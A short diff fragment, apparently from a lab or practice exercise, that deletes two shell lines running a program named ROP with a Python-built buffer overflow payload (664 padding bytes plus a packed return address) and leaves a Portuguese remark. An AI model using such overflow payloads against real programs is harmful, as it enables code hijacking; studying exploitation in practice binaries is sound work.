@@ -1,8 +1,3 @@
-./ROP $(python -c 'import struct; print 'A' *664 +struct.pack("I",0x080484c6))
-
-./ROP $(python -c "import struct; print('A'*664+struct.pack('i',0x080484c6))")
-
-
 
 Vamos la...
 
